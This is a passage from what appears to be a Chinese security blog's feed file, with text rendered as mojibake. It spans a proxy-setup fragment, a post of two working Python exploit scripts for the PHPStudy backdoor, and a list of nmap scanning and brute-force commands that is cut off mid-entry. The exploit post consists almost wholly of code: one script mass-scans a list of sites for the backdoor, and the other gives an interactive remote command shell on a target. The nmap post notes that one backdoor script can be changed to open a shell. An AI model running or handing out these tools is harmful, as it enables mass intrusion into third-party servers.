çš„è¯ï¼Œä¸€èˆ¬éƒ½æ˜¯ wifiï¼Œæˆ–è€…é€šè¿‡è½¬æ¥å¤´æ’ç½‘çº¿çš„è¯ï¼Œé‚£å°±æ˜¯è½¬æ¥å¤´å¯¹åº”çš„ ipï¼‰</p><p>å¦‚æœæ˜¯ NAT è¿ç½‘çš„ï¼Œé‚£ä¹ˆè¦æ‰¾å‡ºå®¿ä¸»æœºä¸­ NAT ç½‘å¡çš„ ipï¼ˆåœ¨ mac é‡Œä½¿ç”¨ parallels desktop è™šæ‹Ÿæœºçš„è¯ï¼ŒNAT ç½‘å¡ä¸€èˆ¬æ˜¯ parallels Shared å¼€å¤´çš„ï¼‰</p><p>3ã€åœ¨è™šæ‹Ÿæœºé‡Œçš„<code>~/.bashrc</code>æˆ–<code>~/.zshrc</code>é‡Œï¼Œæ·»åŠ ä»¥ä¸‹ä¸¤å¥çš„å…¶ä¸­ä¸€å¥ï¼š</p><p>ä¸€èˆ¬å¡«å…¥å±€åŸŸç½‘IPå³å¯</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">export</span> <span class="attribute">ALL_PROXY</span>=SOCKS5://IP:ç«¯å£</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">ALL_PROXY</span>=HTTP://IP:ç«¯å£</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€å¥è¡¨ç¤ºä½¿ç”¨ SOCKS5 ä»£ç†ï¼Œç¬¬äºŒå¥è¡¨ç¤ºä½¿ç”¨ HTTP ä»£ç†ï¼Œip å°±æ˜¯ç¬¬ 2 æ­¥ä¸­æ‰¾åˆ°çš„ ipï¼Œç«¯å£å°±æ˜¯ ss å¯¹åº”çš„ç«¯å£ï¼Œæ‰“å¼€ ss çš„è®¾ç½®é‡Œå°±æœ‰ï¼Œä¸€èˆ¬ ss æœ‰ä¸¤ä¸ªç«¯å£ï¼Œä¸€ä¸ª socks5 ç«¯å£ï¼Œä¸€ä¸ª http ç«¯å£ï¼Œæ‰¾åˆ°å¯¹åº”ç«¯å£å¡«è¿›å»å³å¯ã€‚</p><p>æœ€å source ä¸€ä¸‹é…ç½®æ–‡ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure><p>æˆ–è€…ç”¨ zsh shell çš„è¯å°±æ˜¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure><p>æµ‹è¯• ip æ˜¯å“ªé‡Œçš„ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https:<span class="regexp">//i</span>p.cn</span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¾ç¤ºçš„æ˜¯ä»£ç†æœåŠ¡å™¨æ‰€åœ¨åœ°å€ (æ¯”å¦‚ç¾å›½) å’Œ ipï¼Œé‚£è¯´æ˜ä»£ç†è®¾ç½®æˆåŠŸã€‚</p><p>ç„¶åè¯•è¯•èƒ½å¦è®¿é—® googleï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https:<span class="regexp">//</span>www.google.com</span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¯ Windowsï¼Œå¯ä»¥ç›´æ¥åœ¨ cmd é‡Œè®¾ç”¨<code>set http_proxy=http://127.0.0.1:1087</code>ï¼Œ<code>set https_proxy=http://127.0.0.1:1087</code>ï¼Œ<code>set all_proxy=http://127.0.0.1:1087</code></p><hr><p>æ›´å¥½çš„å†™æ³•</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è®¾ç½®ä½¿ç”¨ä»£ç†</span></span><br><span class="line"><span class="built_in">alias</span> setproxy=<span class="string">&quot;export https_proxy=http://127.0.0.1:1087; export http_proxy=http://127.0.0.1:1087; export all_proxy=socks5://127.0.0.1:1086; echo &#x27;Set proxy successfully&#x27;&quot;</span></span><br><span class="line"><span class="comment"># è®¾ç½®å–æ¶ˆä½¿ç”¨ä»£ç†</span></span><br><span class="line"><span class="built_in">alias</span> unsetproxy=<span class="string">&quot;unset http_proxy; unset https_proxy; unset all_proxy; echo &#x27;Unset proxy successfully&#x27;&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ç§‘å­¦ä¸Šç½‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mac </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPStudyåé—¨recæ‰¹é‡åˆ©ç”¨è„šæœ¬</title>
      <link href="post/12551/"/>
      <url>post/12551/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>åŒ—äº¬æ—¶é—´9æœˆ20æ—¥ï¼Œæ­å·å…¬å®‰å‘å¸ƒã€Šæ­å·è­¦æ–¹é€šæŠ¥æ‰“å‡»æ¶‰ç½‘è¿æ³•çŠ¯ç½ªæš¨â€˜å‡€ç½‘2019â€™ä¸“é¡¹è¡ŒåŠ¨æˆ˜æœã€‹ä¸€æ–‡ï¼Œæ–‡ç« æ›å…‰äº†å›½å†…çŸ¥åPHPè°ƒè¯•ç¯å¢ƒç¨‹åºé›†æˆåŒ…â€œPhpStudyè½¯ä»¶â€é­åˆ°é»‘å®¢ç¯¡æ”¹å¹¶æ¤å…¥â€œåé—¨â€ã€‚æˆªè‡³æ¡ˆå‘ï¼Œè¿‘ç™¾ä¸‡PHPç”¨æˆ·ä¸­è¶…è¿‡67ä¸‡ç”¨æˆ·å·²è¢«é»‘å®¢æ§åˆ¶ï¼Œå¹¶å¤§è‚†ç›—å–è´¦å·å¯†ç ã€èŠå¤©è®°å½•ã€è®¾å¤‡ç ç±»ç­‰æ•æ„Ÿæ•°æ®å¤šè¾¾10ä¸‡å¤šç»„ï¼Œéæ³•ç‰Ÿåˆ©600å¤šä¸‡å…ƒã€‚</p><span id="more"></span><h3 id="æ‰¹é‡æ£€æµ‹"><a href="#æ‰¹é‡æ£€æµ‹" class="headerlink" title="æ‰¹é‡æ£€æµ‹"></a>æ‰¹é‡æ£€æµ‹</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threadpool</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">files=<span class="built_in">input</span>(<span class="string">&#x27;files:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_shell</span>(<span class="params">url</span>):</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;echo md5(123);&quot;</span></span><br><span class="line"></span><br><span class="line">    payload = base64.b64encode(payload.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;accept-charset&#x27;</span>: payload,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip,deflate&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">        r = requests.get(url=url+<span class="string">&#x27;/index.php&#x27;</span>, headers=headers, verify=<span class="literal">False</span>,timeout=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;202cb962ac59075b964b07152d234b70&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;[ + ] BackDoor successful: &#x27;</span>+url+<span class="string">&#x27;===============[ + ]\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(files+<span class="string">&#x27;.success.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">                    f.write(url+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;[ - ] BackDoor failed: &#x27;</span>+url+<span class="string">&#x27;[ - ]\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;[ - ] Timeout: &#x27;</span>+url+<span class="string">&#x27; [ - ]\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(files,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">        lines = f.read().splitlines()</span><br><span class="line"></span><br><span class="line">        task_pool=threadpool.ThreadPool(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">        requests=threadpool.makeRequests(write_shell,lines)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> req <span class="keyword">in</span> requests:</span><br><span class="line"></span><br><span class="line">        task_pool.putRequest(req)</span><br><span class="line"></span><br><span class="line">        task_pool.wait()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="äº¤äº’Shell"><a href="#äº¤äº’Shell" class="headerlink" title="äº¤äº’Shell"></a>äº¤äº’Shell</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> threadpool</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;======Phpstudy Backdoor Exploit---os-shell============\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;===========By  Qing=================\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=====Blogï¼šhttps://www.cnblogs.com/-qing-/==\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">os_shell</span>(<span class="params">url,headers,payload</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url=url+<span class="string">&#x27;/phpinfo.php&#x27;</span>,headers=headers,verify=<span class="literal">False</span>,timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        res = re.findall(<span class="string">&quot;qing(.*?)qing&quot;</span>,r.text,re.S)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[ + ]===========The Response:==========[ + ]\n&quot;</span>)</span><br><span class="line">        res = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[ - ]===========Failed! Timeout...==========[ - ]\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    url = <span class="built_in">input</span>(<span class="string">&quot;input the Url , example:\&quot;http://127.0.0.1/\&quot;\n&quot;</span>)</span><br><span class="line">    payload = <span class="built_in">input</span>(<span class="string">&quot;input the payload , default:echo system(\&quot;whoami\&quot;);\n&quot;</span>)</span><br><span class="line">    de_payload = <span class="string">&quot;echo \&quot;qing\&quot;;system(\&quot;whoami\&quot;);echo \&quot;qing\&quot;;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> payload.strip() == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        payload = de_payload</span><br><span class="line">    payload = <span class="string">&quot;echo \&quot;qing\&quot;;&quot;</span>+payload+<span class="string">&quot;echo \&quot;qing\&quot;;&quot;</span></span><br><span class="line">    payload = base64.b64encode(payload.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    payload = <span class="built_in">str</span>(payload, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;accept-charset&#x27;</span>: payload,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip,deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    os_shell(url=url,headers=headers,payload=payload)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> hacker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHPStudy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmapè„šæœ¬æ£€æµ‹</title>
      <link href="post/63116/"/>
      <url>post/63116/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>åœ¨å®æˆ˜ä¸­ç›¸å¯¹æ¯”è¾ƒå®ç”¨çš„nmapè„šæœ¬</p><span id="more"></span><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># nmap -sV -<span class="keyword">sT</span> -Pn â€“<span class="keyword">open</span> -v 192.168.3.23</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥å°è¯•å…ˆè·å–ä¸‹ç›®æ ‡æœºå™¨å„ä¸ªæœåŠ¡æ›´è¯¦ç»†çš„bannerä¿¡æ¯,å› ä¸ºæœ‰äº›æœåŠ¡å·¥å…·æ¼æ´åªèƒ½å½±å“ç‰¹å®šçš„ç‰ˆæœ¬,æ‰€ä»¥,æå‰çŸ¥é“ä¸€ä¸‹è¿˜æ˜¯éå¸¸æœ‰å¿…è¦çš„:</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># nmap -<span class="keyword">sT</span> -Pn â€“<span class="keyword">open</span> -v banner.nse 192.168.3.23</span><br></pre></td></tr></table></figure><h3 id="å’Œftpç›¸å…³çš„ä¸€äº›æ¼æ´æ£€æµ‹è„šæœ¬"><a href="#å’Œftpç›¸å…³çš„ä¸€äº›æ¼æ´æ£€æµ‹è„šæœ¬" class="headerlink" title="å’Œftpç›¸å…³çš„ä¸€äº›æ¼æ´æ£€æµ‹è„šæœ¬:"></a>å’Œftpç›¸å…³çš„ä¸€äº›æ¼æ´æ£€æµ‹è„šæœ¬:</h3><p>ftp-anon.nse æ£€æŸ¥ç›®æ ‡ftpæ˜¯å¦å…è®¸åŒ¿åç™»å½•,å…‰èƒ½ç™»é™†è¿˜ä¸å¤Ÿ,å®ƒè¿˜ä¼šè‡ªåŠ¨æ£€æµ‹ç›®å½•æ˜¯å¦å¯è¯»å†™,å¦‚,æ‰¹é‡ftpæŠ“é¸¡</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># nmap -p 21 â€“script ftp-anon.nse -v 192.168.3.23</span></span><br></pre></td></tr></table></figure><p>ftp-brute.nse ftpçˆ†ç ´è„šæœ¬ [åªä¼šå°è¯•ä¸€äº›æ¯”è¾ƒç®€å•çš„å¼±å£ä»¤,æ—¶é—´å¯èƒ½è¦ç¨å¾®é•¿ä¸€äº›(æŒ‚vpnä»¥åè¿™ä¸ªçˆ†ç ´é€Ÿåº¦å¯èƒ½ä¼šæ›´æ…¢),æ¯•ç«Ÿ,æ˜¯ç›´æ¥åœ¨å…¬ç½‘çˆ†ç ´]</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># nmap -p 21 â€“script ftp-brute.nse -v 192.168.3.23</span></span><br></pre></td></tr></table></figure><p>ftp-vuln-cve2010-4221.nse ProFTPD 1.3.3cä¹‹å‰çš„netio.cæ–‡ä»¶ä¸­çš„pr_netio_telnet_getså‡½æ•°ä¸­å­˜åœ¨å¤šä¸ªæ ˆæº¢å‡º</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># nmap -p <span class="number">21</span> â€“script ftp-vuln-cve<span class="number">2010-4221</span>.nse -v <span class="number">192.168.3.23</span></span><br></pre></td></tr></table></figure><p>ftp-proftpd-backdoor.nse ProFTPD 1.3.3c è¢«äººæ’åé—¨[proftpd-1.3.3c.tar.bz2],ç¼ºçœåªæ‰§è¡Œidå‘½ä»¤,å¯è‡ªè¡Œåˆ°è„šæœ¬ä¸­å®ƒæ¢æˆèƒ½ç›´æ¥å¼¹shellçš„å‘½ä»¤</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># nmap -p <span class="number">21</span> â€“script ftp-vuln-cve<span class="number">2010-4221</span>.nse -v <span class="number">192.168.3.23</span></span><br></pre></td></tr></table></figure><p>ftp-vsftpd-backdoor.nse VSFTPD v2.3.4 è·ŸProftpåŒæ ·çš„é—®é¢˜,è¢«äººæ’äº†åé—¨</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr"># nmap -p 21</span> â€“script ftp-<span class="attr">vsftpd-backdoor.nse -v 192</span><span class="number">.168</span><span class="number">.3</span><span class="number">.23</span></span><br></pre></td></tr></table></figure><h3 id="å’Œssh-ç›¸å…³çš„ä¸€äº›æ‰«æè„šæœ¬"><a href="#å’Œssh-ç›¸å…³çš„ä¸€äº›æ‰«æè„šæœ¬" class="headerlink" title="å’Œssh ç›¸å…³çš„ä¸€äº›æ‰«æè„šæœ¬:"></a>å’Œssh ç›¸å…³çš„ä¸€äº›æ‰«æè„šæœ¬:</h3><p>sshv1.nse sshv1æ˜¯å¯ä»¥ä¸­é—´äººçš„</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># nmap -p 22 â€“script sshv1.nse -v 192.168.3.23</span></span><br></pre></td></tr></table></figure><h3 id="å’Œsmtp-ç›¸å…³çš„ä¸€äº›æ‰«æè„šæœ¬"><a href="#å’Œsmtp-ç›¸å…³çš„ä¸€äº›æ‰«æè„šæœ¬" class="headerlink" title="å’Œsmtp ç›¸å…³çš„ä¸€äº›æ‰«æè„šæœ¬:"></a>å’Œsmtp ç›¸å…³çš„ä¸€äº›æ‰«æè„šæœ¬:</h3><p>smtp-brute.nse ç®€å•çˆ†ç ´smtp</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># nmap -p 25 â€“script smtp-brute.nse -v 192.168.3.23</span></span><br></pre></td></tr></table></figure><p>smtp-enumâ€“users.nse æšä¸¾ç›®æ ‡smtpæœåŠ¡å™¨çš„é‚®ä»¶ç”¨æˆ·å,å‰ææ˜¯ç›®æ ‡è¦å­˜åœ¨æ­¤é”™è¯¯é…ç½®æ‰è¡Œ</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># nmap -p <span class="number">25</span> â€“script smtp-<span class="meta-keyword">enum</span>-users.nse -v <span class="number">192.168</span><span class="number">.3</span><span class="number">.23</span></span></span><br></pre></td></tr></table></figure><p>smtp-vuln-cve2010-4344.nse Exim 4.70ä¹‹å‰ç‰ˆæœ¬ä¸­çš„string.cæ–‡ä»¶ä¸­çš„string_vformatå‡½æ•°ä¸­å­˜åœ¨å †æº¢å‡º</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># nmap -p <span class="number">25</span> â€“script smtp-vuln-cve<span class="number">2010-4344</span>.nse -v <span class="number">192.168.3.23</span></span><br></pre></td></tr></table></figure><p>smtp-vuln-cve2011-1720.nse Postfix 2.5.13ä¹‹å‰ç‰ˆæœ¬ï¼Œ2.6.10ä¹‹å‰çš„2.6.xç‰ˆæœ¬ï¼Œ2.7.4ä¹‹å‰çš„2.7.xç‰ˆæœ¬å’Œ2.8.3ä¹‹å‰çš„2.8.xç‰ˆæœ¬,å­˜åœ¨æº¢å‡º</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># nmap -p <span class="number">25</span> â€“script smtp-vuln-cve<span class="number">2011-1720</span>.nse -v <span class="number">192.168.3.23</span></span><br></pre></td></tr></table></figure><p>smtp-vuln-cve2011-1764.nse Exim â€œdkim_exim_verify_finish()â€ å­˜åœ¨æ ¼å¼å­—ç¬¦ä¸²æ¼æ´,å¤ªè€åŸºæœ¬å¾ˆéš¾é‡åˆ°äº†</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># nmap -p <span class="number">25</span> â€“script smtp-vuln-cve<span class="number">2011-1764</span>.nse -v <span class="number">192.168.3.23</span></span><br></pre></td></tr></table></figure><h3 id="å’Œpop3-ç›¸å…³çš„ä¸€äº›æ‰«æè„šæœ¬"><a href="#å’Œpop3-ç›¸å…³çš„ä¸€äº›æ‰«æè„šæœ¬" class="headerlink" title="å’Œpop3 ç›¸å…³çš„ä¸€äº›æ‰«æè„šæœ¬:"></a>å’Œpop3 ç›¸å…³çš„ä¸€äº›æ‰«æè„šæœ¬:</h3><p>pop3-brute.nse popç®€å•å¼±å£ä»¤çˆ†ç ´</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># nmap -p 110 â€“script pop3-brute.nse -v 192.168.3.23</span></span><br></pre></td></tr></table></figure><h3 id="å’Œimap-ç›¸å…³çš„ä¸€äº›æ‰«æè„šæœ¬"><a href="#å’Œimap-ç›¸å…³çš„ä¸€äº›æ‰«æè„šæœ¬" class="headerlink" title="å’Œimap ç›¸å…³çš„ä¸€äº›æ‰«æè„šæœ¬:"></a>å’Œimap ç›¸å…³çš„ä¸€äº›æ‰«æè„šæœ¬:</h3><p>imap-brute.nse imapç®€å•å¼±å£ä»¤çˆ†ç ´</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># nmap -p <span class="number">143,993</span> â€“script imap-brute.nse -v <span class="number">192.168.3.23</span></span><br></pre></td></tr></table></figure><h3 id="å’Œdns-ç›¸å…³çš„ä¸€äº›æ¼æ´æ‰«æè„šæœ¬"><a href="#å’Œdns-ç›¸å…³çš„ä¸€äº›æ¼æ´æ‰«æè„šæœ¬" class="headerlink" title="å’Œdns ç›¸å…³çš„ä¸€äº›æ¼æ´æ‰«æè„šæœ¬:"></a>å’Œdns ç›¸å…³çš„ä¸€äº›æ¼æ´æ‰«æè„šæœ¬:</h3><p>dns-zone-transfer.nse æ£€æŸ¥ç›®æ ‡nsæœåŠ¡å™¨æ˜¯å¦å…è®¸ä¼ é€</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># nmap -p 53 â€“script dns-zone-transfer.nse -v 192.168.3.23</span></span><br></pre></td></tr></table></figure><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># nmap -p <span class="number">53</span> â€“script dns-zone-<span class="built_in">transfer</span>.nse â€“script-args dns-zone-<span class="built_in">transfer</span>.domain=<span class="keyword">target</span>.org -v <span class="number">192.168</span><span class="number">.3</span><span class="number">.23</span></span><br></pre></td></tr></table></figure><p>hostmap-ip2hosts.nse 